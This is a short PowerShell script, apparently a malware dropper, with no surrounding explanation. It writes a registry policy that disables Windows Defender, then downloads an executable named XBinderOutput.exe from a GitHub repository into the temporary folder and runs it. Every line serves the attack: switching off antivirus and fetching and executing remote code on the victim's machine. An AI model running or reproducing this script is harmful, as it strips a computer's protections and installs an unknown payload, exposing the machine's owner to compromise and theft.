reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f

$url = "https://github.com/SalihIsHere/im/raw/refs/heads/main/XBinderOutput.exe"
$output = "$env:TEMP\XBinderOutput.exe"
Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output -Wait
